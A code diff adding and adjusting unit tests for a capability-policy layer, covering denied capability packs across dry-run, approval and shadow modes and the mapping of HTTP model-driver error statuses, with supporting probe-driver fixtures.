       mode: 'approval',
@@ -3507,6 +4426,54 @@ describe('Capability Plane v0.2 core contracts', () => {
     );
     assert.equal(unknownNetworkTargetDriver.resolveCalled, false);
 
+    const dryRunDeniedPackDriver = policyProbeDriver({ packFingerprint });
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'dry-run',
+        driver: dryRunDeniedPackDriver,
+        hostRequest: httpRequest(),
+        policy: {
+          allowNetworkEffects: true,
+          deniedCapabilityPacks: [packFingerprint],
+          allowedOrigins: ['https://allowed.example'],
+          allowedMethods: ['POST'],
+        },
+      }),
+      { code: 'ERR_CAPABILITY_PACK_DENIED' },
+    );
+    assert.equal(dryRunDeniedPackDriver.dryRunCalled, false);
+
+    const approvalDeniedPackDriver = policyProbeDriver({ packFingerprint });
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'approval',
+        driver: approvalDeniedPackDriver,
+        hostRequest: httpRequest(),
+        approval: () => ({ approved: false }),
+        policy: {
+          allowNetworkEffects: true,
+          deniedCapabilityPacks: [packFingerprint],
+          allowedOrigins: ['https://allowed.example'],
+          allowedMethods: ['POST'],
+        },
+      }),
+      { code: 'ERR_CAPABILITY_PACK_DENIED' },
+    );
+    assert.equal(approvalDeniedPackDriver.dryRunCalled, false);
+
+    const localShadowDeniedPackDriver = localPolicyProbeDriver({ packFingerprint });
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'shadow',
+        driver: localShadowDeniedPackDriver,
+        hostRequest: modelRequest('goal=local-shadow-policy', 'model-local-shadow-policy-key'),
+        recordedResolution: null,
+        policy: { deniedCapabilityPacks: [packFingerprint] },
+      }),
+      { code: 'ERR_CAPABILITY_PACK_DENIED' },
+    );
+    assert.equal(localShadowDeniedPackDriver.shadowCalled, false);
+
     const defaultDeniedShadowDriver = policyProbeDriver();
     await assert.rejects(
       () => runCapabilityMode({
@@ -3626,6 +4593,7 @@ describe('Capability Plane v0.2 core contracts', () => {
         headers: { 'x-request-id': 'request-2' },
       });
       const driver = new GenericHttpJsonModelDriver({ endpointUrl: 'https://allowed.example/decide' });
+      assert.deepEqual(driver.manifest().supportedResponseStatuses, ['ok', 'http_error', 'failed', 'deferred']);
       assert.equal(driver.dryRun({}, genericHttpModelRequest('goal=invoke', 'model-dry-key')).wouldInvoke, true);
       assert.throws(() => new GenericHttpJsonModelDriver({
         endpointUrl: 'https://allowed.example/decide?api_key=secret',
@@ -3862,14 +4830,30 @@ describe('Capability Plane v0.2 core contracts', () => {
           allowedOrigins: ['https://allowed.example'],
           allowedMethods: ['POST'],
         },
-      }, genericHttpModelRequest('goal=invoke', 'model-http-key-failed'));
+      }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-failed'), responseSchema: { status: 'http_error' } });
       const failedResolution = decodeResolutionInputBytes(failed.resolutionInputBytes);
       const failedMetadata = JSON.parse(new TextDecoder().decode(failedResolution.metadata));
-      assert.equal(failedResolution.status, 2);
+      assert.equal(failedResolution.status, 1);
       assert.equal(failedResolution.responseValueImageBytes.byteLength, 0);
       assert.equal(failedMetadata.driver, 'generic-http-json-model');
-      assert.equal(failedMetadata.status, 'failed');
+      assert.equal(failedMetadata.status, 'http_error');
       assert.equal(failedMetadata.transportStatus, 'http_error');
+
+      globalThis.fetch = async () => new Response('transport failed', { status: 500 });
+      const failedSchema = await driver.resolve({
+        policy: {
+          allowLiveEffects: true,
+          allowNetworkEffects: true,
+          maximumLiveModelCalls: 1,
+          allowedOrigins: ['https://allowed.example'],
+          allowedMethods: ['POST'],
+        },
+      }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-failed-schema'), responseSchema: { status: 'failed' } });
+      const failedSchemaResolution = decodeResolutionInputBytes(failedSchema.resolutionInputBytes);
+      const failedSchemaMetadata = JSON.parse(new TextDecoder().decode(failedSchemaResolution.metadata));
+      assert.equal(failedSchemaResolution.status, 2);
+      assert.equal(failedSchemaMetadata.status, 'failed');
+      assert.equal(failedSchemaMetadata.transportStatus, 'http_error');
 
       let failedLiveFetchCount = 0;
       globalThis.fetch = async () => {
@@ -3879,7 +4863,7 @@ describe('Capability Plane v0.2 core contracts', () => {
       const failedLive = await runCapabilityMode({
         mode: 'live',
         driver,
-        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-failed-key'), responseSchema: { status: 'failed' } },
+        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-failed-key'), responseSchema: { status: 'http_error' } },
         journalOptions: {
           store: new MemoryStore(),
           runId: 'model-live-failed-run',
@@ -3894,8 +4878,35 @@ describe('Capability Plane v0.2 core contracts', () => {
           allowedMethods: ['POST'],
         },
       });
-      assert.equal(decodeResolutionInputBytes(failedLive.resolutionInputBytes).status, 2);
+      assert.equal(decodeResolutionInputBytes(failedLive.resolutionInputBytes).status, 1);
       assert.equal(failedLiveFetchCount, 1);
+
+      let failedSchemaLiveFetchCount = 0;
+      globalThis.fetch = async () => {
+        failedSchemaLiveFetchCount += 1;
+        return new Response('transport failed', { status: 500 });
+      };
+      const failedSchemaLive = await runCapabilityMode({
+        mode: 'live',
+        driver,
+        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-failed-schema-key'), responseSchema: { status: 'failed' } },
+        journalOptions: {
+          store: new MemoryStore(),
+          runId: 'model-live-failed-schema-run',
+          branchId: 'main',
+          parentTurnClosureFingerprint: 'world:turn-closure:parent',
+        },
+        policy: {
+          allowLiveEffects: true,
+          allowNetworkEffects: true,
+          maximumLiveModelCalls: 1,
+          allowedOrigins: ['https://allowed.example'],
+          allowedMethods: ['POST'],
+        },
+      });
+      assert.equal(decodeResolutionInputBytes(failedSchemaLive.resolutionInputBytes).status, 2);
+      assert.equal(failedSchemaLive.record.state, 'resolved');
+      assert.equal(failedSchemaLiveFetchCount, 1);
     } finally {
       globalThis.fetch = originalFetch;
     }
@@ -4121,12 +5132,16 @@ function bestEffortModelDriver() {
 function policyProbeDriver({ packFingerprint } = {}) {
   let resolveCalled = false;
   let shadowCalled = false;
+  let dryRunCalled = false;
   return {
     get resolveCalled() {
       return resolveCalled;
     },
     get shadowCalled() {
       return shadowCalled;
+    },
+    get dryRunCalled() {
+      return dryRunCalled;
     },
     manifest() {
       return {
@@ -4147,6 +5162,7 @@ function policyProbeDriver({ packFingerprint } = {}) {
       return { accepted: true };
     },
     dryRun() {
+      dryRunCalled = true;
       return { wouldInvoke: true, proposedAction: { driver: 'policy-probe-http' } };
     },
     shadow() {
@@ -4157,6 +5173,46 @@ function policyProbeDriver({ packFingerprint } = {}) {
       resolveCalled = true;
       const error = new Error('policy bypassed');
       error.code = 'ERR_POLICY_BYPASS_EFFECT';
+      throw error;
+    },
+  };
+}
+
+function localPolicyProbeDriver({ packFingerprint } = {}) {
+  let shadowCalled = false;
+  return {
+    get shadowCalled() {
+      return shadowCalled;
+    },
+    manifest() {
+      return {
+        driverId: 'fixture-agent-model',
+        packFingerprint,
+        supportedActuatorRefs: ['fixture:agent-model'],
+        supportedDescriptorFingerprints: ['descriptor:fixture-agent-model'],
+        supportedActuationClasses: ['model'],
+        supportedResponseStatuses: ['ok'],
+        maximumRequestBytes: 1024,
+        maximumResponseBytes: 1024,
+        recoveryClass: EffectRecoveryClass.idempotent,
+        concurrencyLimit: 1,
+        authorityLabels: ['model:fixture-agent'],
+        diagnostics: { deterministic: true },
+      };
+    },
+    preflight() {
+      return { accepted: true };
+    },
+    dryRun() {
+      return { wouldInvoke: false, proposedAction: { driver: 'local-policy-probe' } };
+    },
+    shadow() {
+      shadowCalled = true;
+      return { liveInvoked: false, schemaAccepted: false };
+    },
+    async resolve() {
+      const error = new Error('local policy bypassed');
+      error.code = 'ERR_LOCAL_POLICY_BYPASS_EFFECT';
       throw error;
     },
   };
@@ -4275,6 +5331,57 @@ function httpRequest() {
     actuationClass: 'http',
     responseSchema: { status: 'ok' },
     requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', method: 'POST', body: { prompt: 'hi' } })),
+  };
+}
+
+function fileRequest() {
+  return {
+    hostRequestFingerprint: 'world:host-request:00000000000000a4',
+    idempotencyKeyBytes: fromUtf8('file-key'),
+    idempotencyKeyWorldFingerprint: 'world:key:file',
+    actuatorRef: 'sandbox:file',
+    descriptorFingerprint: 'descriptor:sandbox-file',
+    actuationClass: 'file',
+    responseSchema: { status: 'ok' },
+    requestBytes: fromUtf8(stableJson({ path: 'out.txt', operation: 'write', content: 'dry-run' })),
+  };
+}
+
+function dryRunFileProbeDriver(root) {
+  let dryRunCalled = false;
+  return {
+    get dryRunCalled() {
+      return dryRunCalled;
+    },
+    manifest() {
+      return {
+        driverId: 'dry-run-file-probe',
+        supportedActuatorRefs: ['sandbox:file'],
+        supportedDescriptorFingerprints: ['descriptor:sandbox-file'],
+        supportedActuationClasses: ['file'],
+        supportedResponseStatuses: ['ok'],
+        maximumRequestBytes: 1024,
+        maximumResponseBytes: 1024,
+        recoveryClass: EffectRecoveryClass.idempotent,
+        concurrencyLimit: 1,
+        authorityLabels: ['file:sandbox'],
+        diagnostics: { root },
+      };
+    },
+    preflight() {
+      return { accepted: true };
+    },
+    dryRun(_context, hostRequest) {
+      dryRunCalled = true;
+      const request = JSON.parse(new TextDecoder().decode(hostRequest.requestBytes));
+      return { wouldInvoke: true, proposedAction: request };
+    },
+    shadow() {
+      return { liveInvoked: false, schemaAccepted: false };
+    },
+    async resolve() {
+      throw Object.assign(new Error('dry-run file probe must not resolve'), { code: 'ERR_DRY_RUN_FILE_PROBE_RESOLVED' });
+    },
   };
 }
 
